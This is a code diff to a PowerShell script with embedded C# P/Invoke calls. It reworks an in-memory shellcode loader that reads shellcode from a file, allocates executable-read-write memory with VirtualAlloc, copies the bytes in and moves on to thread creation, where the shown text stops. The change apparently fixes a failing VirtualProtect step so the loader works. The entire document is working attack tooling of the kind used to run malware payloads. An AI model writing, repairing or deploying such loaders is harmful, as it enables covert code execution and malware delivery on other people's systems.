@@ -90,7 +90,7 @@ using System;
 using System.Runtime.InteropServices;
 public class NativeMethods {
     [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
+    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
     
     [DllImport("kernel32.dll", SetLastError=true)]
     public static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
@@ -101,27 +101,21 @@ public class NativeMethods {
             $shellcodeBytes = [System.IO.File]::ReadAllBytes($shellcodePath)
             Write-DebugLog "Shellcode loaded: $($shellcodeBytes.Length) bytes"
             
-            # Allocate memory
-            $memAddress = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcodeBytes.Length)
-            Write-DebugLog "Memory allocated at: 0x$($memAddress.ToString('X16'))"
+            # Allocate memory with PAGE_EXECUTE_READWRITE
+            Write-DebugLog "Calling VirtualAlloc with PAGE_EXECUTE_READWRITE"
+            $memAddress = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, [UInt32]$shellcodeBytes.Length, 0x3000, 0x40)
+            $win32Error = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+            Write-DebugLog "VirtualAlloc result: 0x$($memAddress.ToString('X16')), Win32 error: $win32Error"
+            
+            if ($memAddress -eq [IntPtr]::Zero) {
+                Write-DebugLog "ERROR: VirtualAlloc failed with Win32 error: $win32Error"
+                throw "VirtualAlloc failed"
+            }
+            Write-DebugLog "Memory allocated successfully at: 0x$($memAddress.ToString('X16'))"
             
             # Copy shellcode
             [System.Runtime.InteropServices.Marshal]::Copy($shellcodeBytes, 0, $memAddress, $shellcodeBytes.Length)
             Write-DebugLog "Shellcode copied to memory"
-            
-            # Change protection to RX
-            $oldProtect = 0
-            Write-DebugLog "Calling VirtualProtect to change memory protection to RX"
-            $result = [NativeMethods]::VirtualProtect($memAddress, [UInt32]$shellcodeBytes.Length, 0x20, [Ref]$oldProtect)
-            $win32Error = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-            Write-DebugLog "VirtualProtect result: $result, Old protection: $oldProtect, Win32 error: $win32Error"
-            
-            if (-not $result) {
-                Write-DebugLog "ERROR: VirtualProtect failed with Win32 error: $win32Error"
-                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($memAddress)
-                throw "VirtualProtect failed"
-            }
-            Write-DebugLog "Memory protection changed to RX successfully"
             
             # Create thread
             $threadId = 0
